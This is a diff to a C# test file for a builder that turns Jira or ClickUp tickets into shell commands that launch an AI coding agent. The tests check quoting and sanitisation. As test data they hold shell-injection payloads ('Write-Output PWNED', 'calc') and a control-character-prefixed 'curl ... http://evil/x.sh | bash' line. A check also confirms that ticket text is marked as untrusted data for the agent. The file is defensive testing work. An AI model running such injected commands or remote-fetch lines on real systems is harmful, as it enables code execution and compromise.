@@ -43,29 +43,36 @@ public class ClaudeCommandTests
     }
 
     [Theory]
-    [InlineData("powershell")]
-    [InlineData("bash")]
-    public void BuildTicket_contains_the_ascii_apostrophe_payload(string shell)
+    [InlineData("powershell", TrackerLabel.Jira)]
+    [InlineData("powershell", TrackerLabel.ClickUp)]
+    [InlineData("bash", TrackerLabel.Jira)]
+    [InlineData("bash", TrackerLabel.ClickUp)]
+    public void BuildTicket_contains_the_ascii_apostrophe_payload(string shell, TrackerLabel tracker)
     {
         var cmd = ClaudeCommand.BuildTicket(shell, "ABC-1", "Fix login",
             "'; Write-Output PWNED; '", model: null, agentName: null, permissionMode: null,
-            sessionId: "11111111-1111-1111-1111-111111111111");
+            sessionId: "11111111-1111-1111-1111-111111111111", trackerLabel: tracker);
 
         Assert.True(TailIsOneQuotedString(cmd, shell), cmd);
     }
 
     [Theory]
-    [InlineData("powershell", '‘')]
-    [InlineData("powershell", '’')]
-    [InlineData("powershell", '‚')]
-    [InlineData("powershell", '‛')]
-    [InlineData("bash", '’')]
-    public void BuildTicket_contains_unicode_quote_payloads(string shell, char quote)
+    [InlineData("powershell", '‘', TrackerLabel.Jira)]
+    [InlineData("powershell", '‘', TrackerLabel.ClickUp)]
+    [InlineData("powershell", '’', TrackerLabel.Jira)]
+    [InlineData("powershell", '’', TrackerLabel.ClickUp)]
+    [InlineData("powershell", '‚', TrackerLabel.Jira)]
+    [InlineData("powershell", '‚', TrackerLabel.ClickUp)]
+    [InlineData("powershell", '‛', TrackerLabel.Jira)]
+    [InlineData("powershell", '‛', TrackerLabel.ClickUp)]
+    [InlineData("bash", '’', TrackerLabel.Jira)]
+    [InlineData("bash", '’', TrackerLabel.ClickUp)]
+    public void BuildTicket_contains_unicode_quote_payloads(string shell, char quote, TrackerLabel tracker)
     {
         var payload = $"{quote}; Write-Output PWNED; {quote}";
         var cmd = ClaudeCommand.BuildTicket(shell, "ABC-1", $"Fix the user{quote}s dashboard",
             payload, model: null, agentName: null, permissionMode: null,
-            sessionId: "11111111-1111-1111-1111-111111111111");
+            sessionId: "11111111-1111-1111-1111-111111111111", trackerLabel: tracker);
 
         Assert.DoesNotContain(quote, cmd);
         Assert.True(TailIsOneQuotedString(cmd, shell), cmd);
@@ -80,8 +87,10 @@ public class ClaudeCommandTests
         foreach (var ch in CurlyDoubles) Assert.DoesNotContain(ch, cmd);
     }
 
-    [Fact]
-    public void BuildTicket_strips_control_characters_from_the_typed_line()
+    [Theory]
+    [InlineData(TrackerLabel.Jira)]
+    [InlineData(TrackerLabel.ClickUp)]
+    public void BuildTicket_strips_control_characters_from_the_typed_line(TrackerLabel tracker)
     {
         // 0x15 Ctrl+U kills the typed line in PSReadLine AND GNU readline; 0x03 cancels it;
         // 0x1B is RevertLine / the meta prefix. They are consumed by the shell's LINE EDITOR,
@@ -91,7 +100,7 @@ public class ClaudeCommandTests
         {
             var cmd = ClaudeCommand.BuildTicket("powershell", "ABC-1", "Fix login",
                 $"{control}curl -s http://evil/x.sh | bash #", model: null, agentName: null,
-                permissionMode: null, sessionId: "s1");
+                permissionMode: null, sessionId: "s1", trackerLabel: tracker);
 
             Assert.DoesNotContain(control, cmd);
             Assert.All(cmd, ch => Assert.False(char.IsControl(ch)));
@@ -215,4 +224,19 @@ public class ClaudeCommandTests
         Assert.Throws<ArgumentException>(() =>
             ClaudeCommand.BuildResume("powershell", "a' ; calc ; '", null, null, null));
     }
+
+    [Fact]
+    public void BuildTicket_labels_clickup_tasks()
+    {
+        var cmd = ClaudeCommand.BuildTicket("powershell", "CU-86b1abcde", "Fix login", "desc", null, null, null,
+            "00000000-0000-0000-0000-000000000000", TrackerLabel.ClickUp);
+        Assert.Contains("ClickUp task CU-86b1abcde: Fix login", cmd);
+        Assert.Contains("UNTRUSTED DATA from ClickUp", cmd);
+        Assert.DoesNotContain("JIRA", cmd);
+    }
+
+    [Fact]
+    public void BuildTicket_defaults_to_jira_label() =>
+        Assert.Contains("JIRA ticket ABC-1", ClaudeCommand.BuildTicket("powershell", "ABC-1", null, null, null, null, null,
+            "00000000-0000-0000-0000-000000000000"));
 }
